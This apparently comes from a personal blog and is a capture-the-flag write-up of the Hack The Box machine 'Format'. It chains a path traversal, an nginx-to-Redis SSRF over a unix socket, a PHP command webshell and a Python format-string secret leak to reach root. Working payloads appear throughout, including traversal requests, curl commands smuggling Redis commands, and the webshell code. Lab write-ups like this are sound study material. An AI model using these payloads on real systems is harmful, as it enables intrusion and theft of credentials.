---
layout: post
title: "HTB: Format"
subtitle: "path-traversal config leak, nginx-to-Redis SSRF over a unix socket, webshell write, Python format-string privesc"
date: 2023-05-15
tags: [htb, linux, lfi, ssrf, privesc, format-string]
category: writeups
kind: machine
tldr: "An admin edit handler had a path traversal that leaked the nginx config, revealing a proxy that forwards to a Redis unix socket. Abusing that static route I set a pro flag, then wrote a PHP webshell through the same traversal. Redis held cooper's password for SSH. A sudo license tool had a Python format-string bug that leaked the root secret."
---

## the box

Format is a Linux box running nginx 1.18.0 on ports 80 and 3000, plus SSH on 22. Port 80 serves the `microblog.htb` blogging app (PHP), port 3000 is a Gitea instance exposing the full source at `cooper/microblog`. The app uses Redis as its backend over a unix socket.

## recon

nmap showed 22 (OpenSSH 8.4p1, Debian 11), 80, and 3000. Gitea on 3000 gave me the whole codebase under `cooper/microblog`. The app has subdomains including `admin.microblog.htb`. Registering and reading the source showed the admin edit handler manipulates an `order.txt` file by id with no sanitization:

```php
$contents = str_replace($_POST['id'] . "\n", '', $contents);
file_put_contents("order.txt", $contents);
```

## foothold

The `id` parameter took a path traversal. POST to `/edit/index.php` on the admin vhost:

```
id=/etc/passwd&txt=zedzedez
```

The response echoed `/etc/passwd`, confirming arbitrary file read and exposing `cooper` and `git`. I then read the nginx default config the same way, which revealed the interesting part:

```
location ~ /static/(.*)/(.*) {
    resolver 127.0.0.1;
    proxy_pass http://$1.microbucket.htb/$2;
}
```

That regex feeds `$1` straight into a `proxy_pass` host. By setting `$1` to a `unix:` socket target I could make nginx talk to the Redis unix socket. The app's `isPro()` reads a `pro` field from Redis via `HGET`, so I issued an `HSET` through the proxy to flip it:

```
curl http://app.microblog.htb/register/index.php -d 'first-name=test&last-name=test&username=test&password=test'
curl -X "HSET" 'http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:test%20pro%20true%20a/b'
```

The `-X "HSET"` matters: nginx forwards the raw method verb to the upstream, so an invalid HTTP verb lands on the Redis socket as a Redis command. The trailing `a/b` satisfies the `(.*)/(.*)` capture. With pro features unlocked, I used the same `id` traversal to write a PHP webshell. PHP in `/uploads` executes, while `/content` is served as a download, so the shell has to go in `/uploads`:

```
id=../uploads/shell.php&header=<the URL-encoded PHP form below>
```

```php
<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
```

Then `http://admin.microblog.htb/uploads/shell.php?cmd=whoami` ran commands. I curled a reverse shell script in and executed it.

## user

From the shell I read Redis directly over the socket. The keys held cooper's profile:

```
redis-cli -s /var/run/redis/redis.sock hgetall "cooper.dooper"
# username cooper.dooper / password zooperdoopercooper
```

That password logged in over SSH:

```
ssh cooper@microblog.htb   # zooperdoopercooper
```

cooper held the user flag.

## root

cooper could run a license manager as root:

```
User cooper may run the following commands on format:
    (root) /usr/bin/license
```

The script is Python. It builds a license key with `str.format()`, inlining a username pulled from Redis:

```python
license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
```

Since I control the Redis profile, I control the `username`, which is a format string. Setting it to a format expression walks object attributes up to the module globals, where the script reads `secret` from `/root/license/secret`. I set a user's `username` to leak `secret`:

```
redis-cli -s /var/run/redis/redis.sock
hset jack username {license.__init__.__globals__[secret]}
exit
sudo -u root /usr/bin/license -p jack
```

The plaintext license printed the secret embedded in it: `unCR4ckaBL3Pa$$w0rd`. That was the root password:

```
su   # unCR4ckaBL3Pa$$w0rd
```

root, and the root flag.

## takeaway

A regex-driven `proxy_pass` let nginx reach a Redis socket, turning SSRF into data writes, and a `str.format()` call on attacker-controlled data leaked a root secret through `__globals__`. Never format-string untrusted input.
